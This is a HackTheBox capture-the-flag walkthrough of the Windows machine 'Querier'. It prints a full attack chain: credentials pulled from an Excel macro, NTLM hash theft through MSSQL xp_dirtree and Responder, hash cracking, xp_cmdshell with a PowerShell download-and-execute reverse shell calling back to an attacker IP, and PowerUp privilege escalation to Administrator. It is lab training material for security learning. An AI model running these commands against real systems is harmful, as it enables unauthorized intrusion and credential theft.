# Querier

**By Stager** | FashilHack

---

## What is this machine

Querier is a medium Windows box on HackTheBox. The whole box revolves around a running MSSQL server and abusing it step by step — from finding credentials in a macro-enabled Excel file, to stealing an NTLM hash through the SQL server, to getting a shell and escalating privileges using PowerUp.

No web exploitation, no AD attack chains. Just SMB, SQL server abuse, and Windows privesc. A very practical box that teaches techniques you'll use constantly in real Windows environments.

---

## Target

```
IP:  10.10.10.125
OS:  Windows
```

---

## Step 1 — Nmap Scan

```bash
nmap -A -p- -T5 -Pn 10.10.10.125 -v
```

Key findings:

| Port | Service | Detail |
|---|---|---|
| 135 | RPC | Remote Procedure Call |
| 139/445 | SMB | File sharing |
| 1433 | MSSQL | Microsoft SQL Server |
| 5985 | WinRM | Remote management |

MSSQL on port 1433 was the important one. That's the target for this whole box.

![Nmap Results](./images/nmap.png)

---

## Step 2 — SMB Enumeration

Checked for accessible shares anonymously:

```bash
smbmap -H 10.10.10.125
smbclient -L 10.10.10.125
```

Found a readable file share. Inside it was a single file — an `.xlsm` file. That's a macro-enabled Excel file. Downloaded it.

```bash
smbclient //10.10.10.125/sharename
get filename.xlsm
```

![SMB Share Found](./images/smb-share.png)

---

## Step 3 — Extracting Credentials from the Excel Macro

`.xlsm` files can contain VBA macros — and macros often contain hardcoded credentials for things like database connections. Used oletools to extract the macro content without needing Excel:

```bash
pip3 install oletools --break-system-packages
olevba filename.xlsm
```

The macro had a database connection string inside it with a username and password hardcoded in plaintext. Got the credentials.

![oletools macro output](./images/oletools.png)

---

## Step 4 — SMB Access Check with Found Credentials

Before touching MSSQL checked what SMB shares the new user could access:

```bash
smbmap -u mssql-svc -p 'foundpassword' -H 10.10.10.125
```

Confirmed the user existed and had some access. Also confirmed an MSSQL server was running — which matched port 1433 from nmap.

---

## Step 5 — MSSQL Login

Logged into the SQL server using the credentials from the macro:

```bash
impacket-mssqlclient mssql-svc:'foundpassword'@10.10.10.125 -windows-auth
```

Got an MSSQL prompt. Started enumerating what was available.

![MSSQL Login](./images/mssql-login.png)

---

## Step 6 — Stealing NTLM Hash via MSSQL + Responder

The goal here was to make the SQL server connect back to my machine — when it does, it tries to authenticate using NTLM and I can capture that hash.

First started Responder on my tun0 interface to listen for incoming NTLM authentication:

```bash
sudo responder -I tun0
```

Then inside the MSSQL session forced the server to connect to my IP using xp_dirtree:

```sql
xp_dirtree "\\10.10.14.x\anything"
```

The server tried to authenticate to my fake SMB share. Responder caught the NTLM hash of the service account.

![Responder Hash Capture](./images/responder-hash.png)

---

## Step 7 — Cracking the Hash

Saved the hash to hash.txt and cracked it:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Mode 5600 is for NTLMv2 hashes — the format Responder captures. Got the plaintext password.

![Hash Cracked](./images/hashcat.png)

---

## Step 8 — Back into MSSQL with New Credentials

Logged back into MSSQL with the cracked credentials. This time with a higher privilege account — tried to enable command execution:

```sql
help
enable_xp_cmdshell
xp_cmdshell whoami
```

`xp_cmdshell` lets you run OS commands from inside MSSQL. It responded with the service account name — command execution confirmed.

![xp_cmdshell working](./images/xp-cmdshell.png)

---

## Step 9 — Getting a Reverse Shell

Used Nishang's PowerShell reverse shell. Cloned the repo on Kali:

```bash
git clone https://github.com/samratashok/nishang
```

Copied `Invoke-PowerShellTcp.ps1` from the `Shells` folder to my working directory. Added the invocation line at the bottom of the script:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.x -Port 4444
```

Set up a Python web server to serve the file:

```bash
sudo python3 -m http.server 80
```

Set up a netcat listener:

```bash
nc -lvnp 4444
```

Then from inside the MSSQL session triggered the download and execution:

```sql
xp_cmdshell powershell -c IEX(New-Object Net.WebClient).downloadstring("http://10.10.14.x/shell.ps1")
```

The server downloaded and ran the script. Shell came back on netcat.

```bash
whoami
# querier\mssql-svc
```

![Reverse Shell](./images/reverse-shell.png)

---

## Step 10 — Privilege Escalation with PowerUp

Now inside the Windows shell ran PowerUp — a PowerShell script that checks for common Windows privilege escalation paths automatically:

```powershell
IEX(New-Object Net.WebClient).downloadstring("http://10.10.14.x/PowerUp.ps1")
Invoke-AllChecks
```

PowerUp found credentials stored in a Group Policy Preferences file — plaintext administrator credentials sitting in a config file on the system. Got the Administrator username and password directly.

![PowerUp Output](./images/powerup.png)

---

## Step 11 — Login as Administrator

Tried Evil-WinRM first:

```bash
evil-winrm -i 10.10.10.125 -u Administrator -p 'foundpassword'
```

If Evil-WinRM doesn't work tried the Impacket alternatives:

```bash
# Option 2
impacket-psexec 'Administrator:foundpassword@10.10.10.125'

# Option 3
impacket-wmiexec 'Administrator:foundpassword@10.10.10.125'
```

Got in as Administrator. Read both flags.

![Administrator Shell](./images/admin-shell.png)

---

## The Full Chain

```
Nmap → MSSQL on port 1433 + SMB open
  ↓
SMB enumeration → .xlsm file downloaded
  ↓
oletools → VBA macro → hardcoded DB credentials
  ↓
smbmap with creds → confirmed MSSQL access
  ↓
impacket-mssqlclient → logged into SQL server
  ↓
Responder listening → xp_dirtree forces NTLM auth back
  ↓
Responder captures NTLMv2 hash → hashcat cracks it
  ↓
Re-login to MSSQL → enable_xp_cmdshell → OS command execution
  ↓
Nishang shell → xp_cmdshell downloads and runs it → reverse shell
  ↓
PowerUp → Group Policy Preferences → Administrator credentials
  ↓
Evil-WinRM / psexec / wmiexec → Administrator shell
  ↓
root.txt
```

---

## What I learned from this one

**Macro-enabled Office files hide credentials.** xlsm, xlsb, docm — any macro-enabled Office format can contain VBA code with hardcoded connection strings. oletools extracts them without needing Office installed.

**xp_dirtree is how you steal hashes from MSSQL.** The server tries to authenticate to whatever UNC path you give it. Responder catches that authentication attempt as an NTLMv2 hash. This technique works on any MSSQL server that can reach your machine.

**Responder + xp_dirtree is a classic combo.** Start Responder first, then trigger xp_dirtree. The hash arrives in seconds.

**NTLMv2 is mode 5600 in hashcat.** Not 1000 (NTLM) or 18200 (Kerberos). Get the mode wrong and hashcat won't crack anything.

**xp_cmdshell gives you OS execution from SQL.** Once you can run OS commands from inside MSSQL you're one PowerShell download away from a full shell.

**Nishang is the go-to for PowerShell reverse shells on Windows.** Invoke-PowerShellTcp.ps1 is reliable. Add the invocation line at the bottom of the file before serving it.

**PowerUp finds things linpeas misses on Windows.** Group Policy Preferences credentials, unquoted service paths, weak service permissions — PowerUp is purpose-built for Windows and surfaces these fast.

**Always try Evil-WinRM first, then psexec, then wmiexec.** They all get you a shell but behave slightly differently. psexec gives SYSTEM, wmiexec gives the user you authenticated as.

---

_Stager — FashilHack — Simulating Attacks, Securing Businesses._